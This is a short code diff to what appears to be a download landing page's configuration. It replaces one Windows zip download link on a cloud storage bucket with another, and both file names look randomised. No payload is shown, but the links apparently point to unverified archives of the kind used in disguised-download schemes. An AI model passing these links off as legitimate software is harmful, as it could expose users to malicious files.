@@ -55,7 +55,7 @@
        btnRadius: "10px",
        bg: "//p8.qhimg.com/t11098f6bcd5e40dd91a92718e4.webp",
     },
-    downloadUrl: "https://pub-addb8ef101184b368c467ebe49c123d9.r2.dev/Sioppcyyb-xp.win11_stuep56822.124.zip", 
+    downloadUrl: "https://sss33213.s3.ap-south-1.amazonaws.com/Aex_win10-11_RrdBocksxhs_8275.zip", 
     QH:"QH_132_4#18",
     theme:"v2",
     themeBtnColor: "#15CA71",
